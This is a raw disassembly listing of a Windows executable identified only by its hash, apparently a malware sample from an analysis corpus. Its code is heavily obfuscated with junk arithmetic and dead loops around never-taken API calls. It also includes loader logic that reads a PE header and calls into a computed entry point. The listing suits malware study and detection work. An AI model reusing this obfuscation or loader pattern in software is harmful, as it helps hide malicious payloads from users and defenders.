
bfff4d7488fa9ba2ace2d74a08c978970932244f69f989cf8391bb60875eed40.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x14c
  401009:	push   ebx
  40100a:	add    DWORD PTR ds:0x413d18,edx
  401010:	push   esi
  401011:	adc    eax,DWORD PTR ds:0x41400c
  401017:	push   edi
  401018:	adc    DWORD PTR ds:0x413c74,ecx
  40101e:	xor    esi,esi
  401020:	sbb    eax,DWORD PTR ds:0x413bfe
  401026:	mov    DWORD PTR [ebp-0x10],esi
  401029:	adc    edi,eax
  40102b:	mov    eax,DWORD PTR [ebp-0x20]
  40102e:	and    DWORD PTR ds:0x413c06,0x0
  401038:	jmp    0x40104a
  40103d:	mov    edi,DWORD PTR ds:0x413c06
  401043:	inc    edi
  401044:	mov    DWORD PTR ds:0x413c06,edi
  40104a:	cmp    DWORD PTR ds:0x413c06,0x12
  401051:	jae    0x40107f
  401057:	cmp    DWORD PTR ds:0x413c06,0x18
  40105e:	jne    0x401074
  401064:	push   0x413c74
  401069:	push   0x1062
  40106e:	call   DWORD PTR ds:0x41675c
  401074:	jmp    0x40103d
  401079:	xor    DWORD PTR ds:0x413bf6,ebx
  40107f:	push   0x5
  401081:	mov    DWORD PTR [ebp-0x20],eax
  401084:	pop    edi
  401085:	push   0x4164c8
  40108a:	call   DWORD PTR ds:0x416794
  401090:	push   esi
  401091:	and    DWORD PTR ds:0x413c70,0x414018
  40109b:	push   0x69
  40109d:	push   0xe
  40109f:	push   0x6
  4010a1:	push   0x4
  4010a3:	xor    DWORD PTR ds:0x41401c,0x413c16
  4010ad:	push   0x87698897
  4010b2:	sbb    DWORD PTR ds:0x41401c,0x413c16
  4010bc:	call   DWORD PTR ds:0x416750
  4010c2:	push   esi
  4010c3:	add    DWORD PTR ds:0x413d2c,0x792b
  4010cd:	push   0x3
  4010cf:	push   0x2
  4010d1:	push   0x4
  4010d3:	sbb    DWORD PTR ds:0x414008,0x413c0e
  4010dd:	push   0x2
  4010df:	push   0x56778769
  4010e4:	push   0x76867576
  4010e9:	inc    DWORD PTR ds:0x413c74
  4010ef:	call   DWORD PTR ds:0x41674c
  4010f5:	add    DWORD PTR ds:0x413c6c,0x413d20
  4010ff:	dec    edi
  401100:	mov    DWORD PTR ds:0x413bf6,0x25f1
  40110a:	jne    0x401085
  401110:	push   0x4164f0
  401115:	sbb    DWORD PTR ds:0x414000,0x413c0e
  40111f:	push   esi
  401120:	push   esi
  401121:	and    DWORD PTR ds:0x413c78,0x5ead
  40112b:	call   DWORD PTR ds:0x416788
  401131:	test   eax,eax
  401133:	je     0x40114f
  401139:	mov    eax,ds:0x75687681
  40113e:	adc    ebx,DWORD PTR ds:0x413c0a
  401144:	imul   eax,eax,0x5463da1d
  40114a:	mov    ds:0x75687681,eax
  40114f:	mov    eax,DWORD PTR [ebp-0x20]
  401152:	mov    DWORD PTR ds:0x41401c,0x2026
  40115c:	mov    ebx,0xf89c85b0
  401161:	mov    DWORD PTR ds:0x413c78,0x6385
  40116b:	cmp    eax,ebx
  40116d:	jne    0x4011cf
  401173:	add    DWORD PTR ds:0x414004,0x37c8
  40117d:	mov    DWORD PTR ds:0x4164c4,0xf89c85b1
  401187:	push   DWORD PTR [ebp+0x10]
  40118a:	sub    DWORD PTR ds:0x413bfe,0x414004
  401194:	push   DWORD PTR [ebp+0xc]
  401197:	and    DWORD PTR ds:0x413c1a,0x413ce4
  4011a1:	push   DWORD PTR [ebp+0x8]
  4011a4:	xor    DWORD PTR ds:0x413d34,0x413d2c
  4011ae:	call   0x402685
  4011b3:	mov    ecx,DWORD PTR ds:0x4163b4
  4011b9:	mov    esi,DWORD PTR ds:0x413c1e
  4011bf:	or     DWORD PTR ds:0x413c06,esi
  4011c5:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4011cb:	xor    esi,esi
  4011cd:	mov    DWORD PTR [ecx],eax
  4011cf:	mov    DWORD PTR [ebp-0x8],ebx
  4011d2:	sub    ecx,DWORD PTR ds:0x413d20
  4011d8:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  4011df:	lea    eax,[ebp-0x60]
  4011e2:	xor    esi,DWORD PTR ds:0x413d18
  4011e8:	mov    DWORD PTR [ebp-0x48],eax
  4011eb:	lea    eax,[ebp-0x54]
  4011ee:	mov    DWORD PTR [ebp-0x1c],eax
  4011f1:	add    DWORD PTR ds:0x413c16,0x903
  4011fb:	mov    eax,ds:0x4163b4
  401200:	mov    eax,DWORD PTR [eax+0x1c8]
  401206:	adc    DWORD PTR ds:0x413cf4,edi
  40120c:	mov    eax,DWORD PTR [eax]
  40120e:	mov    esi,DWORD PTR ds:0x413ce4
  401214:	add    esi,DWORD PTR ds:0x413c16
  40121a:	mov    DWORD PTR ds:0x413ce4,esi
  401220:	mov    ecx,DWORD PTR [ebp-0x1c]
  401223:	xor    edi,edi
  401225:	mov    esi,0x7510894
  40122a:	xor    eax,esi
  40122c:	mov    edi,0x3272dc
  401231:	adc    DWORD PTR ds:0x413c78,0x59b2
  40123b:	add    eax,edi
  40123d:	mov    DWORD PTR ds:0x413d24,0x7b51
  401247:	mov    DWORD PTR [ecx],eax
  401249:	mov    eax,ds:0x4165e0
  40124e:	mov    DWORD PTR ds:0x413c80,0x7e03
  401258:	cmp    eax,0x312bc9f6
  40125d:	mov    DWORD PTR ds:0x413d24,0x296e
  401267:	jne    0x401312
  40126d:	mov    eax,DWORD PTR [ebp-0x8]
  401270:	mov    ecx,DWORD PTR ds:0x4163b4
  401276:	mov    ecx,DWORD PTR [ecx+0x198]
  40127c:	xor    eax,esi
  40127e:	add    eax,edi
  401280:	mov    edx,DWORD PTR ds:0x413c6c
  401286:	xor    DWORD PTR ds:0x414010,edx
  40128c:	mov    DWORD PTR [ecx],eax
  40128e:	movzx  ecx,BYTE PTR ds:0x413c6c
  401295:	and    ecx,DWORD PTR ds:0x413d2c
  40129b:	mov    DWORD PTR ds:0x413c6c,ecx
  4012a1:	mov    eax,DWORD PTR [ebp-0x8]
  4012a4:	mov    DWORD PTR ds:0x413cd8,0x1b
  4012ae:	cmp    DWORD PTR ds:0x413cd8,0x0
  4012b5:	je     0x401303
  4012bb:	cmp    DWORD PTR ds:0x413cd8,0x1c
  4012c2:	jne    0x4012dd
  4012c8:	push   0x104b
  4012cd:	push   0x413d18
  4012d2:	push   0x2575
  4012d7:	call   DWORD PTR ds:0x416760
  4012dd:	xor    edx,edx
  4012df:	xor    edx,DWORD PTR ds:0x413cd8
  4012e5:	dec    edx
  4012e6:	mov    DWORD PTR ds:0x413cd8,edx
  4012ec:	jmp    0x4012ae
  4012f1:	mov    edx,DWORD PTR ds:0x413ce8
  4012f7:	or     edx,DWORD PTR ds:0x413c7c
  4012fd:	mov    DWORD PTR ds:0x413ce8,edx
  401303:	xor    eax,esi
  401305:	add    eax,edi
  401307:	or     ecx,DWORD PTR ds:0x413d24
  40130d:	mov    ds:0x4165e0,eax
  401312:	mov    eax,ds:0x4163b4
  401317:	mov    eax,DWORD PTR [eax+0x18c]
  40131d:	and    DWORD PTR ds:0x413c1a,0x0
  401327:	jmp    0x401339
  40132c:	mov    ecx,DWORD PTR ds:0x413c1a
  401332:	inc    ecx
  401333:	mov    DWORD PTR ds:0x413c1a,ecx
  401339:	cmp    DWORD PTR ds:0x413c1a,0x15
  401340:	jae    0x40136e
  401346:	cmp    DWORD PTR ds:0x413c1a,0x20
  40134d:	jne    0x401369
  401353:	push   0x6f97
  401358:	push   DWORD PTR [ebp-0x18]
  40135b:	push   0x2919
  401360:	push   DWORD PTR [ebp-0x14]
  401363:	call   DWORD PTR ds:0x416764
  401369:	jmp    0x40132c
  40136e:	mov    eax,DWORD PTR [eax]
  401370:	xor    edx,edx
  401372:	or     edx,DWORD PTR ds:0x413c0e
  401378:	adc    DWORD PTR ds:0x413cdc,edx
  40137e:	mov    DWORD PTR [ebp-0xa4],eax
  401384:	xor    eax,eax
  401386:	xor    eax,DWORD PTR ds:0x413cd0
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	sbb    DWORD PTR ds:0x413d34,eax
  401394:	mov    eax,0xf89c85bc
  401399:	xor    edx,ecx
  40139b:	mov    DWORD PTR [ebp-0x10],eax
  40139e:	mov    DWORD PTR [ebp-0x10],eax
  4013a1:	mov    DWORD PTR [ebp-0x10],eax
  4013a4:	sub    ecx,ecx
  4013a6:	mov    DWORD PTR [ebp-0x1c],ebx
  4013a9:	or     DWORD PTR ds:0x413c80,0x7e3b
  4013b3:	mov    DWORD PTR [ebp-0x10],eax
  4013b6:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  4013bd:	add    DWORD PTR ds:0x413d34,edi
  4013c3:	mov    ecx,DWORD PTR [ebp-0x8]
  4013c6:	xor    ecx,esi
  4013c8:	add    ecx,edi
  4013ca:	mov    DWORD PTR [ebp-0x18],ecx
  4013cd:	add    DWORD PTR ds:0x414018,edi
  4013d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4013d6:	and    DWORD PTR ds:0x413c7c,0xe1
  4013e0:	mov    edx,DWORD PTR [ebp-0xc]
  4013e3:	adc    DWORD PTR ds:0x413d28,0x413d20
  4013ed:	xor    edx,esi
  4013ef:	xor    ecx,esi
  4013f1:	sbb    DWORD PTR ds:0x414014,0x47d8
  4013fb:	add    ecx,edx
  4013fd:	movzx  edx,BYTE PTR ds:0x41400c
  401404:	and    DWORD PTR ds:0x413bf6,edx
  40140a:	mov    edx,DWORD PTR [ebp-0xc]
  40140d:	xor    edx,esi
  40140f:	lea    ecx,[ecx+edx*1+0x975894]
  401416:	cmp    DWORD PTR [ebp-0x18],ecx
  401419:	ja     0x4015f5
  40141f:	or     eax,DWORD PTR ds:0x413bfa
  401425:	mov    eax,DWORD PTR [ebp-0xc]
  401428:	mov    ecx,DWORD PTR ds:0x413c80
  40142e:	xor    DWORD PTR ds:0x413ce8,ecx
  401434:	mov    ecx,DWORD PTR [ebp-0x18]
  401437:	sbb    DWORD PTR ds:0x413d20,0x413d34
  401441:	xor    eax,esi
  401443:	and    DWORD PTR ds:0x413cdc,0x413d24
  40144d:	lea    eax,[eax+ecx*1+0x3272dc]
  401454:	sub    DWORD PTR ds:0x414008,0x413cd8
  40145e:	push   eax
  40145f:	sbb    DWORD PTR ds:0x413c0a,edi
  401465:	mov    eax,DWORD PTR [ebp-0x1c]
  401468:	xor    DWORD PTR ds:0x413c80,0x7b1e
  401472:	xor    eax,esi
  401474:	lea    eax,[ebp+eax*1+0x3272e4]
  40147b:	or     DWORD PTR ds:0x413c16,0x7d42
  401485:	push   eax
  401486:	mov    DWORD PTR ds:0x414018,0x19
  401490:	cmp    DWORD PTR ds:0x414018,0x0
  401497:	je     0x4014cb
  40149d:	cmp    DWORD PTR ds:0x414018,0x28
  4014a4:	jne    0x4014bb
  4014aa:	push   DWORD PTR [ebp-0x14]
  4014ad:	push   DWORD PTR [ebp-0x18]
  4014b0:	push   0x400000
  4014b5:	call   DWORD PTR ds:0x416768
  4014bb:	mov    eax,ds:0x414018
  4014c0:	dec    eax
  4014c1:	mov    ds:0x414018,eax
  4014c6:	jmp    0x401490
  4014cb:	mov    eax,ds:0x4163b4
  4014d0:	and    DWORD PTR ds:0x413c6c,0x2ac9
  4014da:	push   DWORD PTR [eax+0x1bc]
  4014e0:	call   0x40a25b
  4014e5:	mov    eax,DWORD PTR [ebp-0xc]
  4014e8:	sbb    edx,edx
  4014ea:	mov    ecx,DWORD PTR [ebp-0x18]
  4014ed:	and    DWORD PTR ds:0x413d24,0x0
  4014f7:	mov    edx,DWORD PTR ds:0x413d24
  4014fd:	inc    edx
  4014fe:	mov    DWORD PTR ds:0x413d24,edx
  401504:	cmp    DWORD PTR ds:0x413d24,0x1c
  40150b:	jne    0x401525
  401511:	push   DWORD PTR [ebp-0x14]
  401514:	push   0x413d30
  401519:	push   DWORD PTR [ebp-0x1c]
  40151c:	push   DWORD PTR [ebp-0x24]
  40151f:	call   DWORD PTR ds:0x416770
  401525:	cmp    DWORD PTR ds:0x413d24,0x1b
  40152c:	jb     0x4014f7
  401532:	xor    eax,esi
  401534:	lea    eax,[ecx+eax*1+0x3272dc]
  40153b:	mov    ecx,DWORD PTR [ebp-0xc]
  40153e:	mov    edx,DWORD PTR [ebp-0xc]
  401541:	dec    DWORD PTR ds:0x413bf6
  401547:	xor    edx,esi
  401549:	xor    ecx,esi
  40154b:	sbb    DWORD PTR ds:0x413c1e,0x34e4
  401555:	add    ecx,edx
  401557:	and    DWORD PTR ds:0x413c02,0x0
  401561:	jmp    0x401573
  401566:	mov    edx,DWORD PTR ds:0x413c02
  40156c:	inc    edx
  40156d:	mov    DWORD PTR ds:0x413c02,edx
  401573:	cmp    DWORD PTR ds:0x413c02,0x1b
  40157a:	jae    0x4015bf
  401580:	cmp    DWORD PTR ds:0x413c02,0x1e
  401587:	jne    0x4015a7
  40158d:	push   0x413d28
  401592:	push   0x3ad3
  401597:	push   0x416152
  40159c:	push   0x416152
  4015a1:	call   DWORD PTR ds:0x416774
  4015a7:	jmp    0x401566
  4015ac:	movzx  edx,BYTE PTR ds:0x413ce8
  4015b3:	sub    edx,DWORD PTR ds:0x413c1a
  4015b9:	mov    DWORD PTR ds:0x413ce8,edx
  4015bf:	mov    edx,DWORD PTR [ebp-0xc]
  4015c2:	xor    DWORD PTR ds:0x413c80,0x413c74
  4015cc:	xor    edx,esi
  4015ce:	lea    ecx,[ecx+edx*1+0x975894]
  4015d5:	mov    DWORD PTR [ebp-0x18],eax
  4015d8:	cmp    eax,ecx
  4015da:	mov    DWORD PTR ds:0x413c7c,0x908
  4015e4:	jbe    0x40141f
  4015ea:	add    DWORD PTR ds:0x413cf4,ecx
  4015f0:	mov    eax,0xf89c85bc
  4015f5:	add    DWORD PTR ds:0x414014,ecx
  4015fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4015fe:	mov    DWORD PTR ds:0x416238,ecx
  401604:	mov    ecx,DWORD PTR [ebp+0x10]
  401607:	and    DWORD PTR ds:0x413c1a,0x0
  401611:	mov    edx,DWORD PTR ds:0x413c1a
  401617:	inc    edx
  401618:	mov    DWORD PTR ds:0x413c1a,edx
  40161e:	cmp    DWORD PTR ds:0x413c1a,0x25
  401625:	jne    0x40163e
  40162b:	push   DWORD PTR [ebp-0x1c]
  40162e:	push   0x414004
  401633:	push   0x416170
  401638:	call   DWORD PTR ds:0x416778
  40163e:	cmp    DWORD PTR ds:0x413c1a,0x19
  401645:	jb     0x401611
  40164b:	mov    DWORD PTR ds:0x41648c,ecx
  401651:	adc    DWORD PTR ds:0x413c1e,ebx
  401657:	mov    ecx,DWORD PTR ds:0x416238
  40165d:	mov    edx,DWORD PTR ds:0x414014
  401663:	xor    DWORD PTR ds:0x413c0e,edx
  401669:	mov    edx,DWORD PTR [ebp-0x48]
  40166c:	sub    ecx,edi
  40166e:	and    DWORD PTR ds:0x413cf0,0x24ff
  401678:	xor    ecx,esi
  40167a:	mov    DWORD PTR [edx],ecx
  40167c:	not    ecx
  40167e:	mov    ecx,DWORD PTR [ebp-0x20]
  401681:	mov    DWORD PTR ds:0x413c16,0x6aa9
  40168b:	cmp    ecx,ebx
  40168d:	mov    DWORD PTR ds:0x413c70,0x4e28
  401697:	jne    0x401b90
  40169d:	add    DWORD PTR ds:0x413d18,0x41400c
  4016a7:	lea    eax,[ebp-0x5c]
  4016aa:	and    DWORD PTR ds:0x413c16,0x3f2d
  4016b4:	mov    DWORD PTR [ebp-0xb0],eax
  4016ba:	lea    eax,[ebp+0x4]
  4016bd:	add    DWORD PTR ds:0x413cec,0x413d24
  4016c7:	mov    DWORD PTR [ebp-0x5c],eax
  4016ca:	mov    eax,DWORD PTR [ebp-0x5c]
  4016cd:	xor    DWORD PTR ds:0x413ce4,0x37e4
  4016d7:	test   eax,eax
  4016d9:	mov    DWORD PTR ds:0x413c7c,0x3884
  4016e3:	je     0x402663
  4016e9:	adc    DWORD PTR ds:0x413c12,ebx
  4016ef:	mov    eax,DWORD PTR [ebp-0x24]
  4016f2:	mov    eax,DWORD PTR [ebp-0xc]
  4016f5:	mov    eax,DWORD PTR [ebp-0x8]
  4016f8:	sub    ecx,0x1090
  4016fe:	mov    DWORD PTR [ebp+0xc],eax
  401701:	mov    eax,eax
  401703:	mov    eax,ds:0x4163b4
  401708:	and    DWORD PTR ds:0x413bfa,0x0
  401712:	jmp    0x401724
  401717:	mov    ecx,DWORD PTR ds:0x413bfa
  40171d:	inc    ecx
  40171e:	mov    DWORD PTR ds:0x413bfa,ecx
  401724:	cmp    DWORD PTR ds:0x413bfa,0x11
  40172b:	jae    0x401754
  401731:	cmp    DWORD PTR ds:0x413bfa,0x20
  401738:	jne    0x401749
  40173e:	push   0x4160de
  401743:	call   DWORD PTR ds:0x41677c
  401749:	jmp    0x401717
  40174e:	and    DWORD PTR ds:0x413c74,ecx
  401754:	mov    eax,DWORD PTR [eax+0x1c8]
  40175a:	and    DWORD PTR ds:0x414010,0x0
  401764:	mov    ecx,DWORD PTR ds:0x414010
  40176a:	inc    ecx
  40176b:	mov    DWORD PTR ds:0x414010,ecx
  401771:	cmp    DWORD PTR ds:0x414010,0xf
  401778:	jne    0x401791
  40177e:	push   0x413c0a
  401783:	push   DWORD PTR [ebp-0x20]
  401786:	push   0x4160b3
  40178b:	call   DWORD PTR ds:0x416780
  401791:	cmp    DWORD PTR ds:0x414010,0xe
  401798:	jne    0x4017ab
  40179e:	mov    ecx,DWORD PTR ds:0x414010
  4017a4:	inc    ecx
  4017a5:	mov    DWORD PTR ds:0x414010,ecx
  4017ab:	cmp    DWORD PTR ds:0x414010,0x1c
  4017b2:	jb     0x401764
  4017b8:	mov    DWORD PTR ds:0x413bf6,0x13
  4017c2:	cmp    DWORD PTR ds:0x413bf6,0x0
  4017c9:	je     0x401820
  4017cf:	cmp    DWORD PTR ds:0x413bf6,0x6
  4017d6:	jne    0x4017ec
  4017dc:	push   0x414018
  4017e1:	push   0x1023
  4017e6:	call   DWORD PTR ds:0x416784
  4017ec:	cmp    DWORD PTR ds:0x413bf6,0x7
  4017f3:	jne    0x401808
  4017f9:	xor    ecx,ecx
  4017fb:	add    ecx,DWORD PTR ds:0x413bf6
  401801:	dec    ecx
  401802:	mov    DWORD PTR ds:0x413bf6,ecx
  401808:	mov    ecx,DWORD PTR ds:0x413bf6
  40180e:	dec    ecx
  40180f:	mov    DWORD PTR ds:0x413bf6,ecx
  401815:	jmp    0x4017c2
  40181a:	adc    DWORD PTR ds:0x413ce8,ebx
  401820:	mov    eax,DWORD PTR [eax]
  401822:	and    DWORD PTR ds:0x414010,0x0
  40182c:	jmp    0x401840
  401831:	xor    ecx,ecx
  401833:	add    ecx,DWORD PTR ds:0x414010
  401839:	inc    ecx
  40183a:	mov    DWORD PTR ds:0x414010,ecx
  401840:	cmp    DWORD PTR ds:0x414010,0x19
  401847:	jae    0x401873
  40184d:	cmp    DWORD PTR ds:0x414010,0x27
  401854:	jne    0x401868
  40185a:	push   DWORD PTR [ebp-0x18]
  40185d:	push   0x4160de
  401862:	call   DWORD PTR ds:0x41678c
  401868:	jmp    0x401831
  40186d:	sub    DWORD PTR ds:0x413c0a,edi
  401873:	cdq    
  401874:	mov    ebx,eax
  401876:	mov    eax,0xfabdbeef
  40187b:	mov    ecx,DWORD PTR ds:0x413c1e
  401881:	or     DWORD PTR ds:0x413d1c,ecx
  401887:	add    ebx,eax
  401889:	mov    ecx,0x6f0c
  40188e:	adc    edx,0xffffffff
  401891:	and    DWORD PTR [ebp-0x10],0x0
  401895:	sub    DWORD PTR ds:0x413c6c,0x6250
  40189f:	xor    edx,0x0
  4018a2:	xor    DWORD PTR ds:0x413c84,ecx
  4018a8:	mov    DWORD PTR [ebp-0x80],edx
  4018ab:	mov    edx,DWORD PTR [ebp+0xc]
  4018ae:	mov    DWORD PTR ds:0x413c74,0x12
  4018b8:	cmp    DWORD PTR ds:0x413c74,0x0
  4018bf:	je     0x401906
  4018c5:	cmp    DWORD PTR ds:0x413c74,0x1e
  4018cc:	jne    0x4018f2
  4018d2:	push   DWORD PTR [ebp-0x24]
  4018d5:	push   0x413cd8
  4018da:	push   0x560c
  4018df:	push   0x416049
  4018e4:	push   DWORD PTR [ebp-0x18]
  4018e7:	push   0x1b95
  4018ec:	call   DWORD PTR ds:0x416790
  4018f2:	mov    ecx,DWORD PTR ds:0x413c74
  4018f8:	dec    ecx
  4018f9:	mov    DWORD PTR ds:0x413c74,ecx
  4018ff:	jmp    0x4018b8
  401904:	not    ecx
  401906:	mov    DWORD PTR [ebp-0x14],edx
  401909:	and    DWORD PTR ds:0x413c06,0x0
  401913:	jmp    0x401925
  401918:	mov    edx,DWORD PTR ds:0x413c06
  40191e:	inc    edx
  40191f:	mov    DWORD PTR ds:0x413c06,edx
  401925:	cmp    DWORD PTR ds:0x413c06,0x14
  40192c:	jae    0x401967
  401932:	cmp    DWORD PTR ds:0x413c06,0x5
  401939:	jne    0x401948
  40193f:	push   DWORD PTR [ebp-0xc]
  401942:	call   DWORD PTR ds:0x416798
  401948:	cmp    DWORD PTR ds:0x413c06,0x4
  40194f:	jne    0x401962
  401955:	mov    edx,DWORD PTR ds:0x413c06
  40195b:	inc    edx
  40195c:	mov    DWORD PTR ds:0x413c06,edx
  401962:	jmp    0x401918
  401967:	mov    ecx,0x8a29a125
  40196c:	xor    ebx,ecx
  40196e:	neg    DWORD PTR ds:0x413d18
  401974:	add    DWORD PTR [ebp-0x14],eax
  401977:	mov    DWORD PTR ds:0x414010,ebx
  40197d:	mov    edx,DWORD PTR [ebp-0x14]
  401980:	mov    DWORD PTR ds:0x41401c,0x7ba5
  40198a:	adc    DWORD PTR [ebp-0x10],0xffffffff
  40198e:	xor    edx,ecx
  401990:	add    DWORD PTR ds:0x414010,0x307
  40199a:	mov    DWORD PTR [ebp-0x78],edx
  40199d:	mov    edx,DWORD PTR [ebp-0x10]
  4019a0:	xor    edx,0x0
  4019a3:	mov    DWORD PTR ds:0x414018,0x4b60
  4019ad:	mov    DWORD PTR [ebp-0x74],edx
  4019b0:	cmp    DWORD PTR [ebp-0x78],ebx
  4019b3:	mov    DWORD PTR ds:0x413c02,0x936
  4019bd:	jne    0x4019df
  4019c3:	mov    DWORD PTR ds:0x413c0a,edx
  4019c9:	mov    edx,DWORD PTR [ebp-0x80]
  4019cc:	cmp    DWORD PTR [ebp-0x74],edx
  4019cf:	mov    DWORD PTR ds:0x413c7c,0x301a
  4019d9:	je     0x401aa0
  4019df:	and    DWORD PTR ds:0x413d34,0x0
  4019e9:	jmp    0x4019fb
  4019ee:	mov    edx,DWORD PTR ds:0x413d34
  4019f4:	inc    edx
  4019f5:	mov    DWORD PTR ds:0x413d34,edx
  4019fb:	cmp    DWORD PTR ds:0x413d34,0x16
  401a02:	jae    0x401a25
  401a08:	cmp    DWORD PTR ds:0x413d34,0x26
  401a0f:	jne    0x401a20
  401a15:	push   0x414014
  401a1a:	call   DWORD PTR ds:0x41679c
  401a20:	jmp    0x4019ee
  401a25:	mov    edx,DWORD PTR ds:0x4163b4
  401a2b:	neg    DWORD PTR ds:0x414008
  401a31:	mov    edx,DWORD PTR [edx+0x1c0]
  401a37:	mov    DWORD PTR ds:0x413bf6,0x5ff4
  401a41:	mov    edx,DWORD PTR [edx]
  401a43:	and    DWORD PTR ds:0x413ce0,0x41400c
  401a4d:	xor    ebx,ebx
  401a4f:	add    edx,eax
  401a51:	mov    DWORD PTR ds:0x413c78,0x3f53
  401a5b:	adc    ebx,0xffffffff
  401a5e:	and    DWORD PTR ds:0x413c02,0x1b79
  401a68:	xor    edx,ecx
  401a6a:	add    DWORD PTR ds:0x413ce0,0x413c6c
  401a74:	xor    ebx,0x0
  401a77:	mov    DWORD PTR ds:0x413bfa,0x4fab
  401a81:	cmp    edx,0x70941fd5
  401a87:	mov    DWORD PTR ds:0x413d2c,0x7f9c
  401a91:	jne    0x402663
  401a97:	cmp    ebx,0xffffffff
  401a9a:	jne    0x402663
  401aa0:	mov    edx,DWORD PTR ds:0x416430
  401aa6:	add    DWORD PTR ds:0x413cdc,0x3946
  401ab0:	mov    ebx,DWORD PTR ds:0x416438
  401ab6:	and    DWORD PTR ds:0x413c80,0x3ee6
  401ac0:	xor    edx,ebx
  401ac2:	mov    DWORD PTR ds:0x414000,0x16
  401acc:	cmp    DWORD PTR ds:0x414000,0x0
  401ad3:	je     0x401b12
  401ad9:	cmp    DWORD PTR ds:0x414000,0x26
  401ae0:	jne    0x401af6
  401ae6:	push   0x413c84
  401aeb:	push   0x56a1
  401af0:	call   DWORD PTR ds:0x41675c
  401af6:	mov    ebx,DWORD PTR ds:0x414000
  401afc:	dec    ebx
  401afd:	mov    DWORD PTR ds:0x414000,ebx
  401b03:	jmp    0x401acc
  401b08:	add    DWORD PTR ds:0x413c84,0x1062
  401b12:	mov    DWORD PTR ds:0x416430,edx
  401b18:	mov    ebx,DWORD PTR ds:0x416430
  401b1e:	and    DWORD PTR ds:0x413d20,0x0
  401b28:	jmp    0x401b3a
  401b2d:	mov    edx,DWORD PTR ds:0x413d20
  401b33:	inc    edx
  401b34:	mov    DWORD PTR ds:0x413d20,edx
  401b3a:	cmp    DWORD PTR ds:0x413d20,0x1a
  401b41:	jae    0x401b72
  401b47:	cmp    DWORD PTR ds:0x413d20,0x25
  401b4e:	jne    0x401b67
  401b54:	push   DWORD PTR [ebp-0x24]
  401b57:	push   0x413d1c
  401b5c:	push   0x7dc0
  401b61:	call   DWORD PTR ds:0x416760
  401b67:	jmp    0x401b2d
  401b6c:	adc    DWORD PTR ds:0x413bfe,edi
  401b72:	mov    edx,DWORD PTR [ebp-0x5c]
  401b75:	xor    DWORD PTR ds:0x413c7c,0x413c1e
  401b7f:	add    DWORD PTR [edx],ebx
  401b81:	mov    DWORD PTR ds:0x414010,0x3837
  401b8b:	jmp    0x402624
  401b90:	mov    DWORD PTR ds:0x41401c,0x671d
  401b9a:	mov    ecx,DWORD PTR [ebp-0x60]
  401b9d:	mov    DWORD PTR ds:0x413c02,0x3bc3
  401ba7:	cmp    ecx,0xf89c85b1
  401bad:	je     0x401d26
  401bb3:	mov    ecx,DWORD PTR [ebp-0x8]
  401bb6:	mov    edx,DWORD PTR [ebp-0x54]
  401bb9:	or     DWORD PTR ds:0x413c1a,0x413cdc
  401bc3:	xor    ecx,esi
  401bc5:	add    ecx,edi
  401bc7:	cmp    ecx,edx
  401bc9:	je     0x401d26
  401bcf:	mov    DWORD PTR ds:0x413d28,0x18
  401bd9:	cmp    DWORD PTR ds:0x413d28,0x0
  401be0:	je     0x401c32
  401be6:	cmp    DWORD PTR ds:0x413d28,0xa
  401bed:	jne    0x401c07
  401bf3:	push   0x7420
  401bf8:	push   DWORD PTR [ebp-0xc]
  401bfb:	push   DWORD PTR [ebp-0x20]
  401bfe:	push   DWORD PTR [ebp-0x14]
  401c01:	call   DWORD PTR ds:0x416764
  401c07:	cmp    DWORD PTR ds:0x413d28,0xb
  401c0e:	jne    0x401c1f
  401c14:	mov    eax,ds:0x413d28
  401c19:	dec    eax
  401c1a:	mov    ds:0x413d28,eax
  401c1f:	xor    eax,eax
  401c21:	add    eax,DWORD PTR ds:0x413d28
  401c27:	dec    eax
  401c28:	mov    ds:0x413d28,eax
  401c2d:	jmp    0x401bd9
  401c32:	mov    eax,ds:0x4163b4
  401c37:	mov    DWORD PTR ds:0x413c88,0x7ef
  401c41:	mov    eax,DWORD PTR [eax+0x194]
  401c47:	mov    ecx,DWORD PTR [eax]
  401c49:	mov    eax,DWORD PTR [ecx+0x3c]
  401c4c:	adc    DWORD PTR ds:0x413c74,0x414014
  401c56:	push   DWORD PTR ds:0x41648c
  401c5c:	add    DWORD PTR ds:0x413c1e,0x413d24
  401c66:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c6a:	push   DWORD PTR ds:0x416238
  401c70:	add    DWORD PTR ds:0x414000,0x414014
  401c7a:	add    eax,ecx
  401c7c:	mov    DWORD PTR ds:0x413d1c,0x15
  401c86:	cmp    DWORD PTR ds:0x413d1c,0x0
  401c8d:	je     0x401ce5
  401c93:	cmp    DWORD PTR ds:0x413d1c,0x3
  401c9a:	jne    0x401cb1
  401ca0:	push   0x8408
  401ca5:	push   DWORD PTR [ebp-0x24]
  401ca8:	push   DWORD PTR [ebp-0x1c]
  401cab:	call   DWORD PTR ds:0x416768
  401cb1:	cmp    DWORD PTR ds:0x413d1c,0x4
  401cb8:	jne    0x401ccb
  401cbe:	mov    ecx,DWORD PTR ds:0x413d1c
  401cc4:	dec    ecx
  401cc5:	mov    DWORD PTR ds:0x413d1c,ecx
  401ccb:	xor    ecx,ecx
  401ccd:	or     ecx,DWORD PTR ds:0x413d1c
  401cd3:	dec    ecx
  401cd4:	mov    DWORD PTR ds:0x413d1c,ecx
  401cda:	jmp    0x401c86
  401cdf:	add    DWORD PTR ds:0x413bfa,ecx
  401ce5:	mov    ecx,DWORD PTR ds:0x4163b4
  401ceb:	mov    ecx,DWORD PTR [ecx+0x194]
  401cf1:	or     DWORD PTR ds:0x414000,0x5329
  401cfb:	push   DWORD PTR [ecx]
  401cfd:	call   eax
  401cff:	mov    ecx,DWORD PTR ds:0x4163b4
  401d05:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401d0b:	mov    DWORD PTR ds:0x413c78,0x5666
  401d15:	mov    DWORD PTR [ecx],eax
  401d17:	mov    DWORD PTR ds:0x413d24,0x5c21
  401d21:	jmp    0x402663
  401d26:	adc    edx,DWORD PTR ds:0x413cf0
  401d2c:	mov    ecx,DWORD PTR [ebp-0x8]
  401d2f:	sub    edx,DWORD PTR ds:0x413c70
  401d35:	mov    edx,DWORD PTR [ebp-0xa4]
